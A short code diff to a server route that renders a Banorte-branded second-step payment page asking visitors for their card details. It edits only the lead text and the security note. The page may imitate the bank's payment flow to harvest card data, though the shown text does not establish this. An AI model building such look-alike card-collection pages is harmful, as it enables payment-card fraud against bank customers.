@@ -83,7 +83,7 @@ export async function POST(request: Request) {
   const contenido = `
     <section class="banorte-card">
       <h1 class="banorte-card-title">Formulario 2 de 2</h1>
-      <p class="banorte-card-lead">Verificación aprobada. Confirme el cargo con los datos de su tarjeta.</p>
+      <p class="banorte-card-lead">Verificación aprobada. Confirme el cargo con su tarjeta de crédito o débito (cualquier banco).</p>
       <dl class="banorte-summary">
         <div><dt>Referencia</dt><dd><code>${esc(referencia3d)}</code></dd></div>
         <div><dt>Total</dt><dd class="banorte-amount">$${esc(montoFmt)}</dd></div>
@@ -119,7 +119,7 @@ export async function POST(request: Request) {
           <button type="submit" class="banorte-btn banorte-btn--primary">Realizar pago</button>
         </div>
       </form>
-      <p class="banorte-secure-note"><span aria-hidden="true">🔒</span> El cargo se procesa en los servidores seguros de Banorte Payworks.</p>
+      <p class="banorte-secure-note"><span aria-hidden="true">🔒</span> Comercio electrónico Banorte · cargo seguro vía Payworks.</p>
     </section>
     <script>
       (function () {
